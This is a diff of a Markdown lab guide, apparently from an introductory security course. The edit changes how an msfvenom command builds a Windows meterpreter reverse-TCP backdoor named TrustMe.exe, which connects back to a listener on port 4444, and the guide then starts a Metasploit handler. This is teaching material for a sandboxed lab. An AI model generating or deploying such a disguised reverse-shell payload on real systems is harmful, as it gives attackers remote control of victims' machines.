@@ -64,7 +64,11 @@ ifconfig
 Run the following commands to start a simple backdoor and backdoor listener: 
 
 ```bash
-msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /tmp/TrustMe.exe
+cd /tmp/
+```
+
+```bash
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > /tmp/TrustMe.exe
 ```
 
 Let's start the **Metasploit** Handler. We need another **Linux Terminal**
@@ -194,6 +198,7 @@ Please be sure to destroy the lab environment!
 [Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)
 
 ---
+
 
 
 
